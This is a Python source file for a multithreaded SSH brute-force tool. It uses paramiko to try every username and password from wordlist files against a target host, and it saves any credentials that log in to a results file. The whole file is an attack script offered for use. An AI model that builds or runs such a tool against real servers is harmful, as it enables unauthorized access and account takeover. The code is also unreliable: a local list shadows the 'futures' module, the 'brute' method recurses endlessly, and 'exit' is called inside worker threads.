import paramiko
from concurrent.futures import ThreadPoolExecutor
from concurrent import futures
class SSH:
    def __init__(self,threads:int, hostname:str, port:int) -> None:
        self.threads=threads
        self.hostname=hostname
        self.port=port
        self.PASSWORDS = self.fetch_files('./temp_files/passwords.txt')
        self.USERS = self.fetch_files('./temp_files/users.txt')
    def fetch_files(self,file_path):
        return [item.replace("\n", "") for item in open(file_path).readlines()]
    def ssh_connect(self,username, password):
        # Create an SSH client
        client = paramiko.SSHClient()

        # Automatically add the target's host key
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            # Connect to the SSH server
            client.connect(self.hostname, port=self.port, username=username, password=password)
            print('Connection successful.')
            result = "\n[+] --------------------------------------------------------------"
            result += "\n[+] YOooCHA!! \nTheese Credentials succeed to LogIn:\n> username: " + username + " and " \
                                                                                                    "password: " \
                                                                                                    "" + password
            result += "\n[+] --------------------------------------------------------------\n"
            with open("./temp_files/results.txt", "w+") as frr:
                frr.write(result)
            print(
                "[+] A Match succeed 'user: " + username + " and password: " + password + "' and have been saved at "
                                                                                    "./results.txt")
            exit()

        except paramiko.AuthenticationException:
            print("Authentication failed. Please check your credentials.")
        except paramiko.SSHException as e:
            print(f"SSH connection failed: {str(e)}")
        except Exception as e:
            print(f"An error occurred: {str(e)}")

        # Close the SSH connection
        client.close()
    def process_passwords(self,username:str):
        with ThreadPoolExecutor(5) as executor:
            futures = []
            for password in self.PASSWORDS:
                future = executor.submit(
                    self.ssh_connect,
                    username,
                    password
                )
                futures.append(future)

            # Wait for all futures to complete
            futures.wait(futures)
    def process_usernames(self):
        with ThreadPoolExecutor(self.threads) as executor:
            executor.map(self.process_passwords,self.USERS)
    def brute(self):
        self.brute()

